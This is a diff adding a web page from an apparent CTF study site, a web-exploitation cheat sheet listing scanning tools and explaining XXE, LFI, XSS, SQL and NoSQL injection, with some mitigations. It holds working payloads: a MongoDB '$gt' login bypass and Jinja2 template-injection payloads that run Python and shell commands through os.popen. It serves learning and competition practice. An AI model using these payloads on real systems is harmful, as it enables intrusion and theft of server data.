@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<title>Web - CTF Journey</title>
+<meta name="description" content="find the spider">
+
+<meta name="author" content="GitHub Contributor Team"><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "CTF Journey",
+    
+    "url": "https:\/\/example.org\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/example.org\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/example.org\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/example.org\/notes\/web\/",
+          "name": "Web"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "GitHub Contributor Team"
+  },
+  "headline": "Web",
+  "description" : "find the spider",
+  "inLanguage" : "en",
+  "wordCount":  652 ,
+  "datePublished" : "0001-01-01T00:00:00",
+  "dateModified" : "0001-01-01T00:00:00",
+  "image" : "https:\/\/example.org\/",
+  "keywords" : [ "guide" ],
+  "mainEntityOfPage" : "https:\/\/example.org\/notes\/web\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/example.org\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/example.org\/",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="Web" />
+<meta property="og:description" content="find the spider">
+<meta property="og:url" content="https://example.org/notes/web/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="CTF Journey" />
+<link rel="apple-touch-icon" sizes="180x180" href=" https://example.org/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://example.org/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://example.org/favicon/favicon-16x16.png">
+
+
+<meta name="generator" content="Hugo 0.118.2">
+<link rel="alternate" href="https://example.org/index.xml" type="application/rss+xml" title="CTF Journey">
+<script src="https://example.org/js/dark-mode.js"></script><link rel="stylesheet" href="/style.min.css">
+
+
+
+
+
+
+
+  </head>
+  <body>
+    
+<div class="container fixed-top mw-100">
+  <div class="row justify-content-center">
+    <div class="col-sm-12 col-md-12 col-lg-10 col-xl-10">
+
+      <nav class="navbar navbar-expand-lg navbar-light fixed-top p-0">
+        <div class="container">
+
+          <a class="navbar-brand fw-bold" href="https://example.org/">CTF Journey</a>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
+            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+          </button>
+
+          <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+            <ul class="navbar-nav mb-2 mb-lg-0 align-items-baseline">
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="Home"
+                  href="/"> Home</a>
+              </li>
+
+              
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="Guides"
+                  href="/notes/"> Guides</a>
+              </li>
+
+              
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="Writeups"
+                  href="/tags/writeup/"> Writeups</a>
+              </li>
+
+              
+              
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="GitHub"
+                  href="https://github.com/ctf-journey"> GitHub</a>
+              </li>
+
+              
+              
+
+              <li class="nav-item nav-link">
+                <a id="dark-mode-toggle" class="bi bi-moon-stars" role="button"></a>
+              </li>
+
+              
+            </ul>
+
+            
+          </div>
+        </div>
+      </nav>
+
+    </div>
+  </div>
+</div>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+<header class="header-section ">
+
+  <div class="intro-header no-img mt-10">
+    <div class="container">
+      <div class="row justify-content-center">
+
+        
+        <div class="col-sm-12 col-md-12 col-lg-8 col-xl-8">
+          
+
+          
+          <div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">
+            
+
+            <div class="notes-heading">
+              
+
+              
+
+              
+              <h1 class="fw-semibold display-5 lh-1 mb-3"> 
+                Web
+                
+              </h1>
+              
+              
+
+              
+
+              
+              
+              
+            </div>
+          </div>
+          
+        </div>
+        
+        
+      </div>
+      
+    </div>
+  </div>
+</header>
+
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 ">
+
+      <div class="card-image card-image-blog p-0">
+        
+        
+
+
+        
+      </div>
+    </div>
+
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
+      <article role="main" class="blog-post">
+        <h2 id="resources">Resources</h2>
+<ul>
+<li>PayloadAllTheThings <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master">Github</a></li>
+</ul>
+<h1 id="api-testing">API Testing</h1>
+<ul>
+<li>Postman</li>
+<li>Insomia</li>
+</ul>
+<h2 id="web-directory-bruteforcers">Web directory bruteforcers</h2>
+<ul>
+<li>dirb (run dirb on terminal)</li>
+<li>dirbuster (requires GUI)</li>
+<li>gobuster (similar tool)</li>
+<li>dirsearch(faster alternative to dirb) <a href="https://github.com/maurosoria/dirsearch">GitHub</a></li>
+</ul>
+<h2 id="web-crawlers">Web crawlers</h2>
+<ul>
+<li>dirhunt <a href="https://github.com/Nekmo/dirhunt">GitHub</a></li>
+</ul>
+<h2 id="packet-utils">Packet utils</h2>
+<ul>
+<li>Burp Suite (requires GUI) <a href="https://portswigger.net/burp">Website</a></li>
+<li>wget</li>
+</ul>
+<h2 id="xxe-xml-external-entity-injection">XXE (XML external entity) injection</h2>
+<ul>
+<li>Happens when an application parses uses data from XML files which can be modified to be malicious
+<a href="https://portswigger.net/web-security/xxe">Website</a></li>
+</ul>
+<h2 id="lfi-local-file-inclusion">LFI (Local File Inclusion)</h2>
+<ul>
+<li>Commonly found in PHP web application (maybe through Wordpress plugins etc)</li>
+<li>Vulnerable websites can allow you to access local files through directory traversal</li>
+<li>Look out for ways where you can supply a file path and it is served as a download/printed to the page</li>
+</ul>
+<h2 id="xss">XSS</h2>
+<ul>
+<li>Stored XSS</li>
+</ul>
+<blockquote>
+<p>Website uses external resources that contains malicious code<!-- raw HTML omitted -->
+If an SVG with XSS payload is in an iframe or embed of a website, it can be executed</p>
+</blockquote>
+<ul>
+<li>Reflected XSS</li>
+</ul>
+<blockquote>
+<p>When queries to a website is handled and returned in an unsafe way</p>
+</blockquote>
+<ul>
+<li>DOM based XSS</li>
+</ul>
+<blockquote>
+<p>Client side attack, browser executes payload that didn&rsquo;t came from the server</p>
+</blockquote>
+<h2 id="sql-injection">SQL Injection</h2>
+<h3 id="testing">Testing</h3>
+<ul>
+<li>Try using one (single or double) quote for the input and see if there is any errors</li>
+<li>If an error is returned, the website might be vulnerable</li>
+</ul>
+<h3 id="types-of-attack">Types of attack</h3>
+<ul>
+<li>Union based attack</li>
+</ul>
+<blockquote>
+<p>Application displays the output of the query, allowing you to steal information from the database</p>
+</blockquote>
+<ul>
+<li>Error based attack</li>
+</ul>
+<blockquote>
+<p>Application returns an error with details about the query, helping you to craft queries to bypass checks</p>
+</blockquote>
+<ul>
+<li>Resources</li>
+</ul>
+<blockquote>
+<p>Sqlmap <a href="https://github.com/sqlmapproject/">GitHub</a><!-- raw HTML omitted -->
+Learn and try using SQL <a href="http://mystery.knightlab.com/">Website</a></p>
+</blockquote>
+<h2 id="query-selector-injection">Query Selector Injection</h2>
+<h3 id="example">Example</h3>
+<ul>
+<li>In MongoDB + NodeJS web apps</li>
+</ul>
+<blockquote>
+<p>Query for login details</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">users</span>.<span style="color:#a6e22e">find</span>({<span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">username</span>, <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">password</span>});
+</span></span></code></pre></div><blockquote>
+<p>Malicious input</p>
+</blockquote>
+<pre tabindex="0"><code>{
+    &#34;username&#34;: {&#34;$gt&#34;: &#34;&#34;},
+    &#34;password&#34;: {&#34;$gt&#34;: &#34;&#34;}
+}
+</code></pre><blockquote>
+<p>{&quot;$gt&quot;: &ldquo;&rdquo;} will result in true, $gt is a query selector which compares with &quot;&quot;</p>
+</blockquote>
+<h3 id="mitigation">Mitigation</h3>
+<ul>
+<li>Make sure input gets sanitised as string</li>
+<li>Remove $ and . to prevent query selectors</li>
+</ul>
+<h2 id="server-side-template-injection-ssti">Server-side Template Injection (SSTI)</h2>
+<h3 id="testing-1">Testing:</h3>
+<pre tabindex="0"><code>{{ 7*&#39;7&#39; }}
+    Twig: 49
+    Jinja2: 7777777
+{{ 7 }}
+    Golang: 7
+</code></pre><h3 id="how-to-perform-the-ssti">How to perform the SSTI:</h3>
+<p>For Flask servers:</p>
+<p>Get config:
+<code>{{config}}</code></p>
+<p>Python RCE:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> c<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>values() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> b<span style="color:#f92672">.</span>__class__ <span style="color:#f92672">==</span> {}<span style="color:#f92672">.</span>__class__ <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>      {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;eval&#39;</span> <span style="color:#f92672">in</span> b<span style="color:#f92672">.</span>keys() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>        {{ b[<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#e6db74">&#39;&lt;Python code here&gt;&#39;</span>) }}
+</span></span><span style="display:flex;"><span>      {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>Execute shell statements:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> c<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>values() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> b<span style="color:#f92672">.</span>__class__ <span style="color:#f92672">==</span> {}<span style="color:#f92672">.</span>__class__ <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>      {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;eval&#39;</span> <span style="color:#f92672">in</span> b<span style="color:#f92672">.</span>keys() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>        {{ b[<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#e6db74">&#39;__import__(&#34;os&#34;).popen(&#34;&lt;SHELL STATEMENT HERE&gt;&#34;).read()&#39;</span>) }}
+</span></span><span style="display:flex;"><span>      {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>Get all classes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__() }}
+</span></span></code></pre></div><p>Get local/global variables (from Python RCE)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> []<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>      {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> c<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;catch_warnings&#39;</span> <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> b <span style="color:#f92672">in</span> c<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>values() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> b<span style="color:#f92672">.</span>__class__ <span style="color:#f92672">==</span> {}<span style="color:#f92672">.</span>__class__ <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>          {<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;eval&#39;</span> <span style="color:#f92672">in</span> b<span style="color:#f92672">.</span>keys() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>            {{ b[<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#e6db74">&#39;dict(globals(), **locals())&#39;</span>) }}
+</span></span><span style="display:flex;"><span>          {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>        {<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>      {<span style="color:#f92672">%</span> endif <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    {<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>For golang:</p>
+<pre tabindex="0"><code>{{.&lt;variable or function here&gt;}}
+</code></pre><p>Note that the dot is important.</p>
+<ul>
+<li>Reference/more info <a href="https://github.com/w181496/Web-CTF-Cheatsheet#ssti">GitHub</a> / <a href="https://github-com.translate.goog/w181496/Web-CTF-Cheatsheet?_x_tr_sl=zh-CN&amp;_x_tr_tl=en&amp;_x_tr_hl=en-US&amp;_x_tr_pto=wapp#ssti">Translated Version</a></li>
+<li>Payload for more languages <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">Website</a></li>
+<li>Payload all the things SSTI <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Github</a></li>
+</ul>
+<h2 id="csrf">CSRF</h2>
+<h3 id="testing-2">Testing</h3>
+<ul>
+<li>Steps to test for CSRF <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery">Guide</a></li>
+</ul>
+<h2 id="broken-authentication">Broken Authentication</h2>
+<h3 id="testing-3">Testing</h3>
+<ul>
+<li>Steps to test for Broken Authentication <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Guide</a></li>
+</ul>
+<h2 id="apache">Apache</h2>
+<ul>
+<li><code>.htaccess</code> files are configuration files for its directory</li>
+</ul>
+<h2 id="practice">Practice</h2>
+<ul>
+<li>bWAPP, a free and open source deliberately insecure web application <a href="http://www.itsecgames.com/">Website</a></li>
+</ul>
+<h2 id="common-python-applications-pitfalls">Common python applications pitfalls</h2>
+<ul>
+<li>Article explainling various common python application pitfalls which can be exploited <a href="https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1">Website</a></li>
+</ul>
+<h2 id="common-files">Common files</h2>
+<ul>
+<li><code>robots.txt</code> contains information for crawlers to know which files and directories it has permission to check, this could potentially show hidden files</li>
+<li><code>sitemap.xml</code> contains infomation about the pages a site has to help search engines crawl and index through the website faster</li>
+</ul>
+<h2 id="aws-configuration-flaw">AWS configuration flaw</h2>
+<ul>
+<li>Pacu, a web exploitation framework for exploiting configuration flaws in AWS servers <a href="https://github.com/RhinoSecurityLabs/pacu">GitHub</a></li>
+</ul>
+<h1 id="cookie-attack">Cookie Attack</h1>
+<ul>
+<li>Flask Unsign [Python Tool]](<a href="https://pypi.org/project/flask-unsign/">https://pypi.org/project/flask-unsign/</a>)</li>
+</ul>
+
+      </article>
+    </div>
+  </div>
+
+  
+  <div class="row">
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+      <hr class="m-0"/>
+    </div>
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-2">
+      
+      <div class="blog-tags">
+        
+        <a href="https://example.org/tags/guide/">guide</a>
+        
+      </div>
+      
+    </div>
+
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
+      
+    </div>
+
+    
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 mt-3">
+      <div class="card">
+        <div class="row no-gutters">
+
+          
+
+
+          <div class="col-md-10">
+            <div class="card-body p-1.1">
+              <p class="p-0 m-0"><small class="text-muted">Written By</small></p>
+              <p class="card-text fs-5 m-0">
+                 
+                
+                GitHub Contributor Team
+                
+
+              </p>
+
+               
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    
+
+    <div class="col-lg-8 offset-lg-2 col-md-12 offset-md-1 pt-4">
+      
+      <ul class="list-group list-group-horizontal" style="flex-direction: row">
+        
+
+
+        
+        <li class="list-group-item ms-auto b-0 p-0">
+          <a type="button" class="btn btn-dark" role="button" href="https://example.org/notes/reverse-engeineering/"
+            data-toggle="tooltip" data-placement="top" title="Reverse Engineering">Next Post
+            &rarr;</a>
+        </li>
+        
+      </ul>
+      
+    </div>
+
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 pt-4">
+    </div>
+  </div>
+  
+</div>
+
+<div class="">
+  
+  
+
+  
+
+</div>
+
+    
+
+
+<footer>
+
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <ul
+          class="list-inline list-group list-group-horizontal text-center footer-links d-flex justify-content-center flex-row">
+
+          
+          <li>
+            <a href="mailto:privacy_mini@gmail.com" title="Email me" target="_blank">
+              <span class="mx-2">
+                <i class="bi bi-envelope"></i>
+              </span>
+            </a>
+          </li>
+          <li>
+            <a href="https://github.com/ctf-journey" title="GitHub" target="_blank">
+              <span class="mx-2">
+                <i class="bi bi-github"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+      </div>
+    </div>
+
+    <div class="row">
+      <div class="col-md-12">
+        <p class="credits copyright text-muted">
+          
+          
+          <a href="https://github.com/Mini-Ware/CTF-Journey/graphs/contributors">GitHub Contributor Team</a>
+          
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+          2020
+          
+
+          
+          &nbsp;&bull;&nbsp;
+          <a href="https://example.org/">CTF Journey</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          Powered by <a href="https://gohugo.io">Hugo</a> & <a href="https://github.com/binokochumolvarghese/lightbi-hugo">Lightbi.
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+
+    
+  </body>
+</html>
+
